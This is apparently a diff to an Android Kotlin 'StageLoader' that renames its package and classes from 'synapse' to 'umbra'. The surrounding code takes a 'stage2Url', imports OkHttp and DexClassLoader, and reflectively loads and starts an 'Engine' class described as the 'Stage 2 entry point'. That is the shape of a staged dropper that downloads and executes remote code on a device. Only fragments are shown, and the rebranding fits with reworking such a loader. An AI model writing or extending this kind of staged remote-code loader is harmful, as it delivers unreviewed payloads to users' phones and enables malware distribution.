@@ -1,9 +1,9 @@
-package org.synapse.core.core
+package org.umbra.core.core
 
 import android.content.Context
 import android.util.Log
 import dalvik.system.DexClassLoader
-import org.synapse.core.core.CryptoEngine
+import org.umbra.core.core.CryptoEngine
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import okhttp3.OkHttpClient
@@ -12,7 +12,7 @@ import java.io.File
 import java.util.concurrent.TimeUnit
 
 object StageLoader {
-    private const val TAG = "Synapse.Stage"
+    private const val TAG = "Umbra.Stage"
 
     suspend fun load(context: Context, stage2Url: String): Boolean = withContext(Dispatchers.IO) {
         try {
@@ -40,7 +40,7 @@ object StageLoader {
             )
 
             // Load and invoke Stage 2 entry point
-            val engineClass = classLoader.loadClass("org.synapse.core.core.SynapseEngine")
+            val engineClass = classLoader.loadClass("org.umbra.core.core.UmbraEngine")
             val instance = engineClass.getMethod("getInstance").invoke(null)
             engineClass.getMethod("start", Context::class.java).invoke(instance, context)
 
